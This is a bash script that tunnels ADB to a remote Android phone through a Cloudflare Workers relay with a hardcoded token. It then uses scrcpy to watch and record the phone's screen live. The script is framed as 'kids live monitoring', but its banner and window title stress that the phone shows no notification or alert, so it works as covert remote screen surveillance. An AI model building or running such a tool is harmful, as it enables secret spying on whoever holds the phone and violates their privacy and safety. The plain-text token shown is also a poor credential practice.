#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
ROOT_DIR="$( cd "$DIR/../.." >/dev/null 2>&1 && pwd )"
ADB="$ROOT_DIR/bin/adb"
SCRCPY="$ROOT_DIR/bin/scrcpy"
WEBSOCAT="$ROOT_DIR/bin/websocat"

TOKEN="sk_phone_bridge_8f3a9d2c1e7b45"
WORKER_URL="wss://phone-adb-bridge.joyakter414.workers.dev/ws?role=pc&token=$TOKEN"

clear
echo "============================================================"
echo "   👀 HECTOR SILENT SPECTATOR (KIDS LIVE MONITORING)       "
echo "============================================================"
echo "Phone Status   : Being used in kid's/user's hands"
echo "Phone Display  : Normal (NO notification, NO alert on phone)"
echo "PC Display     : 60 FPS Silent Spectator (View-Only Mode)"
echo "Optional Record: Auto-records session to Desktop/KidsActivity"
echo "============================================================"
echo ""

# Connect Cloudflare Relay
pkill -f "tcp-l:127.0.0.1:5556" 2>/dev/null
"$WEBSOCAT" -b -E --ping-interval 15 tcp-l:127.0.0.1:5556 "$WORKER_URL" &
BRIDGE_PID=$!

sleep 2
"$ADB" connect 127.0.0.1:5556

RECORD_DIR="$HOME/Desktop/KidsActivity"
mkdir -p "$RECORD_DIR"
RECORD_FILE="$RECORD_DIR/live_session_$(date +%Y%m%d_%H%M%S).mp4"

echo "Launching silent 60 FPS live monitor..."
echo "Video saving to: $RECORD_FILE"
echo ""

# Scrcpy in spectator mode (no mouse disruption to kids, full 60 FPS live view + recording)
"$SCRCPY" -s 127.0.0.1:5556 \
  --no-control \
  --record="$RECORD_FILE" \
  --window-title "Live Monitoring (Silent Spectator - No Notice on Phone)"

kill $BRIDGE_PID 2>/dev/null
echo "Monitoring closed. Recording saved: $RECORD_FILE"
